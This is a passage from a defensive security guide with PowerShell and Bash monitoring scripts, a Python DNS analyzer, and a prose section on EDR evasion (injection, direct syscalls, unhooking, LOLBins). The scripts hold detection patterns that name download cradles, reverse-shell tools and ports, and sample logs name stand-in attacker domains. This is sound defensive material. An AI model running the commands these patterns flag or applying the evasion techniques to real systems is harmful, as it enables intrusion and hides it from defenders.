    Unregister-Event -SourceIdentifier "USBMonitor"
    Write-Log "USB Monitor stopped" "INFO"
}
```

### PowerShell: Process Behavior Monitor

```powershell
# =====================================================
# PROCESS BEHAVIOR MONITORING SCRIPT
# Purpose: Detect suspicious process behaviors
# Deploy: Run as SYSTEM via scheduled task
# =====================================================

$LogPath = "C:\SecurityLogs\ProcessMonitor.log"

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $LogPath -Value "[$Timestamp] [$Level] $Message"
}

# Suspicious indicators
$SuspiciousPatterns = @{
    CommandLine = @(
        '-w hidden',
        '-windowstyle hidden',
        '-ep bypass',
        '-executionpolicy bypass',
        '-enc ',
        '-encodedcommand',
        'IEX',
        'Invoke-Expression',
        'DownloadString',
        'DownloadFile',
        'Net.WebClient',
        'Start-BitsTransfer',
        'certutil.*-urlcache',
        'bitsadmin.*\/transfer',
        'mshta.*http',
        'regsvr32.*\/i:http'
    )

    ParentChild = @{
        # Suspicious parent-child relationships
        'winword.exe' = @('powershell.exe', 'cmd.exe', 'wscript.exe', 'mshta.exe')
        'excel.exe' = @('powershell.exe', 'cmd.exe', 'wscript.exe', 'mshta.exe')
        'outlook.exe' = @('powershell.exe', 'cmd.exe', 'wscript.exe')
        'wmiprvse.exe' = @('powershell.exe', 'cmd.exe')
    }
}

Write-Log "Process Monitor started" "INFO"

# Create WMI event subscription for process creation
$Query = @"
SELECT * FROM __InstanceCreationEvent
WITHIN 1
WHERE TargetInstance ISA 'Win32_Process'
"@

Register-WmiEvent -Query $Query -SourceIdentifier "ProcessMonitor" -Action {
    $Process = $Event.SourceEventArgs.NewEvent.TargetInstance
    $ProcessName = $Process.Name
    $ProcessID = $Process.ProcessId
    $CommandLine = $Process.CommandLine
    $ParentID = $Process.ParentProcessId

    # Get parent process name
    $ParentProcess = Get-Process -Id $ParentID -ErrorAction SilentlyContinue
    $ParentName = if ($ParentProcess) { $ParentProcess.Name + ".exe" } else { "Unknown" }

    $Alerts = @()

    # Check for suspicious command line patterns
    foreach ($Pattern in $SuspiciousPatterns.CommandLine) {
        if ($CommandLine -match $Pattern) {
            $Alerts += "Suspicious command line pattern: $Pattern"
        }
    }

    # Check for suspicious parent-child relationships
    if ($SuspiciousPatterns.ParentChild.ContainsKey($ParentName)) {
        if ($ProcessName -in $SuspiciousPatterns.ParentChild[$ParentName]) {
            $Alerts += "Suspicious parent-child: $ParentName -> $ProcessName"
        }
    }

    # If alerts found, log and alert
    if ($Alerts.Count -gt 0) {
        $AlertMessage = @"
[SUSPICIOUS PROCESS DETECTED]
Process: $ProcessName (PID: $ProcessID)
Parent: $ParentName (PID: $ParentID)
Command: $CommandLine
Alerts:
$($Alerts -join "`n")
"@
        Write-Log $AlertMessage "CRITICAL"

        # Write to Windows Event Log
        Write-EventLog -LogName Application -Source "Process Monitor" -EventId 9002 -EntryType Warning -Message $AlertMessage
    }
}

Write-Log "Process Monitor is running" "INFO"

while ($true) { Start-Sleep -Seconds 3600 }
```

### Bash: Linux System Monitor

```bash
#!/bin/bash
# =====================================================
# LINUX SECURITY MONITORING SCRIPT
# Purpose: Monitor for suspicious activity
# Deploy: Run as service via systemd
# =====================================================

LOG_FILE="/var/log/security_monitor.log"
ALERT_FILE="/var/log/security_alerts.log"

# Logging function
log() {
    local level=$1
    local message=$2
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $message" >> "$LOG_FILE"
    if [ "$level" == "CRITICAL" ] || [ "$level" == "WARNING" ]; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $message" >> "$ALERT_FILE"
    fi
}

# Check for new SUID binaries
check_suid() {
    local baseline_file="/var/lib/security_monitor/suid_baseline.txt"
    local current_file="/tmp/suid_current.txt"

    find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | sort > "$current_file"

    if [ -f "$baseline_file" ]; then
        local new_suids=$(comm -13 "$baseline_file" "$current_file")
        if [ -n "$new_suids" ]; then
            log "CRITICAL" "New SUID/SGID binaries detected: $new_suids"
        fi
    else
        mkdir -p /var/lib/security_monitor
        cp "$current_file" "$baseline_file"
        log "INFO" "SUID baseline created"
    fi
}

# Check for suspicious cron entries
check_cron() {
    # System crontabs
    for cron in /etc/crontab /etc/cron.d/*; do
        if [ -f "$cron" ]; then
            # Look for suspicious patterns
            if grep -E "(curl|wget|nc |ncat|bash -i|python.*-c|perl.*-e)" "$cron" 2>/dev/null; then
                log "WARNING" "Suspicious cron entry in $cron"
            fi
        fi
    done

    # User crontabs
    for user in $(cut -d: -f1 /etc/passwd); do
        if crontab -l -u "$user" 2>/dev/null | grep -E "(curl|wget|nc |bash -i)"; then
            log "WARNING" "Suspicious cron entry for user $user"
        fi
    done
}

# Check for suspicious network connections
check_network() {
    # Outbound connections on suspicious ports
    local suspicious=$(ss -tunapl 2>/dev/null | grep -E ":(4444|5555|6666|1337|31337|8080|9001)" | grep ESTAB)
    if [ -n "$suspicious" ]; then
        log "CRITICAL" "Suspicious network connection detected: $suspicious"
    fi

    # Connections from unusual processes
    local shells=$(lsof -i -P 2>/dev/null | grep -E "(bash|sh|zsh|python|perl|ruby)" | grep ESTABLISHED)
    if [ -n "$shells" ]; then
        log "WARNING" "Shell process with network connection: $shells"
    fi
}

# Check for suspicious processes
check_processes() {
    # Processes running from /tmp or /dev/shm
    local tmp_procs=$(ls -la /proc/*/exe 2>/dev/null | grep -E "(tmp|shm)")
    if [ -n "$tmp_procs" ]; then
        log "CRITICAL" "Process running from tmp/shm: $tmp_procs"
    fi

    # Hidden processes (process hiding detection)
    local ps_count=$(ps aux 2>/dev/null | wc -l)
    local proc_count=$(ls -1 /proc 2>/dev/null | grep -E '^[0-9]+$' | wc -l)
    local diff=$((proc_count - ps_count))
    if [ $diff -gt 5 ]; then
        log "CRITICAL" "Possible hidden processes detected (diff: $diff)"
    fi
}

# Check for SSH authorized_keys modifications
check_ssh_keys() {
    for home in /home/* /root; do
        local auth_keys="$home/.ssh/authorized_keys"
        if [ -f "$auth_keys" ]; then
            local current_hash=$(sha256sum "$auth_keys" 2>/dev/null | cut -d' ' -f1)
            local baseline_file="/var/lib/security_monitor/ssh_$(basename $home).hash"

            if [ -f "$baseline_file" ]; then
                local baseline_hash=$(cat "$baseline_file")
                if [ "$current_hash" != "$baseline_hash" ]; then
                    log "CRITICAL" "authorized_keys modified for $(basename $home)"
                    echo "$current_hash" > "$baseline_file"
                fi
            else
                echo "$current_hash" > "$baseline_file"
            fi
        fi
    done
}

# Check for suspicious shell profiles
check_profiles() {
    local profiles=("/etc/profile" "/etc/bash.bashrc")
    for user_home in /home/* /root; do
        profiles+=("$user_home/.bashrc" "$user_home/.profile" "$user_home/.bash_profile")
    done

    for profile in "${profiles[@]}"; do
        if [ -f "$profile" ]; then
            if grep -E "(curl|wget|nc |python.*-c|base64.*-d|eval)" "$profile" 2>/dev/null; then
                log "WARNING" "Suspicious content in $profile"
            fi
        fi
    done
}

# Monitor auth log for brute force
check_auth_log() {
    local failed_count=$(grep "Failed password" /var/log/auth.log 2>/dev/null | grep -c "$(date '+%b %d')")
    if [ "$failed_count" -gt 100 ]; then
        log "WARNING" "High number of failed auth attempts today: $failed_count"
    fi

    # Check for successful root login from unusual source
    local root_logins=$(grep "Accepted.*root" /var/log/auth.log 2>/dev/null | tail -5)
    if [ -n "$root_logins" ]; then
        log "INFO" "Root login detected: $root_logins"
    fi
}

# Main monitoring loop
log "INFO" "Security monitor started"

while true; do
    log "INFO" "Running security checks..."

    check_suid
    check_cron
    check_network
    check_processes
    check_ssh_keys
    check_profiles
    check_auth_log

    log "INFO" "Security checks completed"

    # Sleep for 5 minutes between checks
    sleep 300
done
```

## Red Team: EDR Evasion Techniques (For Testing)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ RED TEAM: EDR EVASION TECHNIQUES (FOR AUTHORIZED TESTING)                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ PURPOSE:                                                                     │
│ ────────                                                                     │
│ Understanding evasion techniques helps:                                      │
│ • Red teams test if EDR is properly configured                               │
│ • Blue teams understand detection gaps                                       │
│ • Security teams improve their defenses                                      │
│                                                                              │
│ TECHNIQUE 1: PROCESS INJECTION                                               │
│ ───────────────────────────────────                                          │
│ Instead of spawning a new suspicious process, inject into a legitimate one.  │
│                                                                              │
│ Why it works:                                                                │
│ • EDR monitors process creation heavily                                      │
│ • Activity from explorer.exe or svchost.exe looks normal                     │
│ • No new process = fewer alerts                                              │
│                                                                              │
│ Detection (Blue Team):                                                       │
│ • Monitor for CreateRemoteThread (Sysmon Event 8)                            │
│ • Watch for unusual memory allocations                                       │
│ • Use memory scanning for injected code                                      │
│                                                                              │
│                                                                              │
│ TECHNIQUE 2: DIRECT SYSCALLS                                                 │
│ ─────────────────────────────────                                            │
│ Call Windows kernel functions directly, bypassing user-mode hooks.           │
│                                                                              │
│ Why it works:                                                                │
│ • EDR hooks ntdll.dll to monitor API calls                                   │
│ • Direct syscalls bypass these hooks                                         │
│ • Makes malicious activity invisible to EDR                                  │
│                                                                              │
│ Detection (Blue Team):                                                       │
│ • Kernel-mode EDR components                                                 │
│ • ETW (Event Tracing for Windows) monitoring                                 │
│ • Memory integrity checks                                                    │
│                                                                              │
│                                                                              │
│ TECHNIQUE 3: UNHOOKING                                                       │
│ ────────────────────────                                                     │
│ Remove EDR hooks from ntdll.dll by reloading a clean copy.                   │
│                                                                              │
│ Why it works:                                                                │
│ • EDR modifies ntdll.dll in memory to intercept calls                        │
│ • Loading fresh copy from disk removes hooks                                 │
│ • Subsequent calls won't be monitored                                        │
│                                                                              │
│ Detection (Blue Team):                                                       │
│ • Monitor for ntdll.dll being read from disk                                 │
│ • Detect memory modifications to ntdll.dll                                   │
│ • Use multiple hooking points                                                │
│                                                                              │
│                                                                              │
│ TECHNIQUE 4: SLEEP OBFUSCATION                                               │
│ ───────────────────────────────                                              │
│ Encrypt malicious code in memory when not executing.                         │
│                                                                              │
│ Why it works:                                                                │
│ • Memory scanners look for malicious patterns                                │
│ • Encrypted code doesn't match signatures                                    │
│ • Decrypt only when needed, re-encrypt after                                 │
│                                                                              │
│ Detection (Blue Team):                                                       │
│ • Look for encryption/decryption patterns                                    │
│ • Monitor memory protection changes                                          │
│ • Use heuristic detection                                                    │
│                                                                              │
│                                                                              │
│ TECHNIQUE 5: TRUSTED BINARIES (LOLBins)                                      │
│ ─────────────────────────────────────────                                    │
│ Use Microsoft-signed binaries for malicious purposes.                        │
│                                                                              │
│ Examples:                                                                    │
│ • msbuild.exe - Compile and execute inline C#                                │
│ • installutil.exe - Execute code via custom installer                        │
│ • regasm.exe - Register and execute .NET assembly                            │
│ • mshta.exe - Execute HTA applications                                       │
│                                                                              │
│ Why it works:                                                                │
│ • These are Microsoft-signed, trusted binaries                               │
│ • Whitelisted in many environments                                           │
│ • Legitimate use cases exist                                                 │
│                                                                              │
│ Detection (Blue Team):                                                       │
│ • Create rules for unusual LOLBin usage                                      │
│ • Monitor command-line arguments                                             │

## DNS Monitoring - Critical for Detection

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DNS MONITORING - THE MOST VALUABLE DATA SOURCE                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHY DNS IS CRITICAL:                                                         │
│ ─────────────────────                                                        │
│ • Almost all C2 uses DNS (to resolve C2 server)                              │
│ • DNS is rarely blocked (needed for everything)                              │
│ • Attackers assume DNS isn't monitored                                       │
│ • DNS tunneling bypasses most security controls                              │
│ • Historical DNS data aids forensics                                         │
│                                                                              │
│ WHAT TO MONITOR IN DNS:                                                      │
│ ────────────────────────                                                     │
│                                                                              │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │ INDICATOR                    │ WHAT IT MEANS                            │ │
│ ├──────────────────────────────┼──────────────────────────────────────────┤ │
│ │ New/rare domains             │ Potential C2 infrastructure              │ │
│ │ High entropy domain names    │ DGA (Domain Generation Algorithm)        │ │
│ │ Long subdomain strings       │ DNS tunneling (data in queries)          │ │
│ │ High query volume to domain  │ Data exfiltration                        │ │
│ │ TXT record queries           │ DNS tunneling (data in responses)        │ │
│ │ Queries to IP addresses      │ Bypassing DNS (direct C2)                │ │
│ │ Failed DNS queries (NXDOMAIN)│ DGA probing                              │ │
│ │ Queries to dynamic DNS       │ Attacker infrastructure                  │ │
│ └──────────────────────────────┴──────────────────────────────────────────┘ │
│                                                                              │
│ DNS MONITORING TOOLS:                                                        │
│ ─────────────────────                                                        │
│ • Passive DNS databases (DNSDB, PassiveTotal, VirusTotal)                    │
│ • Zeek DNS logs                                                              │
│ • Windows DNS debug logging                                                  │
│ • Pi-hole (for home/small networks)                                          │
│                                                                              │
│ EXAMPLE: DETECTING BADUSB C2 VIA DNS                                         │
│ ─────────────────────────────────────                                        │
│                                                                              │
│ Scenario: Flipper Zero payload connects to attacker C2                       │
│                                                                              │
│ DNS Query Log:                                                               │
│ ┌────────────────────────────────────────────────────────────────────────┐  │
│ │ Time       │ Source        │ Query                │ Type │ Response    │  │
│ ├────────────┼───────────────┼──────────────────────┼──────┼─────────────┤  │
│ │ 14:32:01   │ 192.168.1.50  │ evil.attacker.com    │ A    │ 45.33.32.1  │  │
│ │ 14:32:05   │ 192.168.1.50  │ c2.evil.attacker.com │ A    │ 45.33.32.2  │  │
│ │ 14:32:10   │ 192.168.1.50  │ data.evil.attacker.  │ TXT  │ [base64]    │  │
│ │            │               │ com                  │      │             │  │
│ └────────────┴───────────────┴──────────────────────┴──────┴─────────────┘  │
│                                                                              │
│ Detection Indicators:                                                        │
│ • New domain never queried before                                            │
│ • Multiple subdomains queried rapidly                                        │
│ • TXT record query (uncommon for user activity)                              │

### Python: DNS Analysis Script

```python
#!/usr/bin/env python3
"""
DNS Log Analysis Script
Purpose: Detect suspicious DNS activity
Input: DNS query logs (Zeek, Windows DNS, or similar)
"""

import re
import math
from collections import defaultdict
from datetime import datetime

class DNSAnalyzer:
    def __init__(self):
        self.query_counts = defaultdict(int)
        self.domain_first_seen = {}
        self.alerts = []

        # Known dynamic DNS providers (often used by attackers)
        self.dynamic_dns = [
            'duckdns.org', 'no-ip.com', 'dynu.com',
            'freedns.afraid.org', 'hopto.org', 'zapto.org'
        ]

    def calculate_entropy(self, string):
        """Calculate Shannon entropy of a string (higher = more random)"""
        if not string:
            return 0
        entropy = 0
        length = len(string)
        for char in set(string):
            freq = string.count(char) / length
            entropy -= freq * math.log2(freq)
        return entropy

    def check_dga(self, domain):
        """Check if domain looks like DGA (Domain Generation Algorithm)"""
        # Remove TLD
        parts = domain.split('.')
        if len(parts) < 2:
            return False

        main_domain = parts[-2]

        # Check entropy (DGA domains are typically random-looking)
        entropy = self.calculate_entropy(main_domain)

        # High entropy (>3.5) with long name suggests DGA
        if entropy > 3.5 and len(main_domain) > 10:
            return True

        # Check for lack of vowels (DGA indicator)
        vowels = set('aeiou')
        vowel_count = sum(1 for c in main_domain.lower() if c in vowels)
        if len(main_domain) > 8 and vowel_count / len(main_domain) < 0.2:
            return True

        return False

    def check_dns_tunneling(self, query):
        """Check for DNS tunneling indicators"""
        # Very long subdomain (data encoded in query)
        parts = query.split('.')
        for part in parts[:-2]:  # Exclude domain and TLD
            if len(part) > 30:
                return True

        # Total query length over 50 characters
        if len(query) > 50:
            return True

        return False

    def analyze_query(self, timestamp, source_ip, query, query_type):
        """Analyze a single DNS query for suspicious indicators"""

        # Track first-seen domains
        domain = '.'.join(query.split('.')[-2:])
        if domain not in self.domain_first_seen:
            self.domain_first_seen[domain] = timestamp
            self.alerts.append({
                'time': timestamp,
                'type': 'NEW_DOMAIN',
                'severity': 'LOW',
                'source': source_ip,
                'details': f'First query to domain: {domain}'
            })

        # Check for DGA
        if self.check_dga(query):
            self.alerts.append({
                'time': timestamp,
                'type': 'DGA_SUSPECTED',
                'severity': 'HIGH',
                'source': source_ip,
                'details': f'Possible DGA domain: {query}'
            })

        # Check for DNS tunneling
        if self.check_dns_tunneling(query):
            self.alerts.append({
                'time': timestamp,
                'type': 'DNS_TUNNELING',
                'severity': 'HIGH',
                'source': source_ip,
                'details': f'Possible DNS tunneling: {query}'
            })

        # Check for dynamic DNS
        for dyndns in self.dynamic_dns:
            if query.endswith(dyndns):
                self.alerts.append({
                    'time': timestamp,
                    'type': 'DYNAMIC_DNS',
                    'severity': 'MEDIUM',
                    'source': source_ip,
                    'details': f'Dynamic DNS query: {query}'
                })
                break

        # Check for TXT queries (often used for tunneling)
        if query_type == 'TXT':
            self.alerts.append({
                'time': timestamp,
                'type': 'TXT_QUERY',
                'severity': 'MEDIUM',
                'source': source_ip,
                'details': f'TXT record query: {query}'
            })

        # Track query volume per domain
        self.query_counts[domain] += 1
        if self.query_counts[domain] == 100:
            self.alerts.append({
                'time': timestamp,
                'type': 'HIGH_VOLUME',
                'severity': 'MEDIUM',
                'source': source_ip,
                'details': f'High query volume to domain: {domain}'
            })

    def print_alerts(self):
        """Print all alerts sorted by severity"""
        severity_order = {'HIGH': 0, 'MEDIUM': 1, 'LOW': 2}
        sorted_alerts = sorted(self.alerts,
                              key=lambda x: severity_order[x['severity']])

        print("\n" + "="*70)
        print("DNS ANALYSIS ALERTS")
        print("="*70)

        for alert in sorted_alerts:
            print(f"\n[{alert['severity']}] {alert['type']}")
            print(f"  Time: {alert['time']}")
            print(f"  Source: {alert['source']}")
            print(f"  Details: {alert['details']}")


# Example usage
if __name__ == "__main__":
    analyzer = DNSAnalyzer()

    # Simulated DNS queries (would come from log file)
    test_queries = [
        ('2024-01-15 14:32:01', '192.168.1.50', 'google.com', 'A'),
        ('2024-01-15 14:32:05', '192.168.1.50', 'xjk8f2la9m4b.evil.com', 'A'),  # DGA
        ('2024-01-15 14:32:10', '192.168.1.50', 'aGVsbG8gd29ybGQ.data.exfil.com', 'A'),  # Tunneling
        ('2024-01-15 14:32:15', '192.168.1.50', 'myc2.duckdns.org', 'A'),  # Dynamic DNS
        ('2024-01-15 14:32:20', '192.168.1.50', 'config.evil.com', 'TXT'),  # TXT query
    ]

    for ts, src, query, qtype in test_queries:
        analyzer.analyze_query(ts, src, query, qtype)

    analyzer.print_alerts()
```

### Bash: Quick Network Analysis Commands

```bash
#!/bin/bash
# =====================================================
# NETWORK ANALYSIS QUICK COMMANDS
# Purpose: Quick network security checks
# Run: Source this file or run individual commands
# =====================================================

# === CONNECTION ANALYSIS ===

# Show all established connections with process names
echo "=== Established Connections ==="
netstat -tunapl 2>/dev/null | grep ESTABLISHED || \
ss -tunapl | grep ESTAB

# Find connections to non-standard ports (potential C2)
echo -e "\n=== Suspicious Port Connections ==="
netstat -tunapl 2>/dev/null | grep -E ":(4444|5555|6666|1337|31337|8080|9001) " || \
ss -tunapl | grep -E ":(4444|5555|6666|1337|31337|8080|9001) "

# === DNS ANALYSIS ===

# Show recent DNS queries (requires tcpdump capture)
echo -e "\n=== Recent DNS Queries (5 seconds) ==="
timeout 5 tcpdump -i any port 53 -n 2>/dev/null | head -20

# Check /etc/resolv.conf for suspicious DNS servers
echo -e "\n=== DNS Configuration ==="
cat /etc/resolv.conf

# === LISTENING SERVICES ===

echo -e "\n=== Listening Services ==="
netstat -tulnp 2>/dev/null || ss -tulnp

# Find processes listening that shouldn't be
echo -e "\n=== Suspicious Listeners (non-standard ports) ==="
netstat -tulnp 2>/dev/null | grep -vE ":(22|80|443|53|25) " || \
ss -tulnp | grep -vE ":(22|80|443|53|25) "

# === ARP TABLE (detect spoofing) ===

echo -e "\n=== ARP Table ==="
arp -a 2>/dev/null || ip neigh

# Check for duplicate MAC addresses (ARP spoofing indicator)
echo -e "\n=== Checking for ARP Spoofing ==="
arp -a 2>/dev/null | awk '{print $4}' | sort | uniq -d

# === ROUTING TABLE ===

echo -e "\n=== Routing Table ==="
route -n 2>/dev/null || ip route

# === FIREWALL RULES ===

echo -e "\n=== Firewall Rules ==="
iptables -L -n 2>/dev/null || nft list ruleset 2>/dev/null

# === NETWORK INTERFACES ===

echo -e "\n=== Network Interfaces ==="
ip addr

# Check for promiscuous mode (sniffing indicator)
echo -e "\n=== Promiscuous Mode Check ==="
ip link | grep PROMISC

echo -e "\n=== Analysis Complete ==="
```
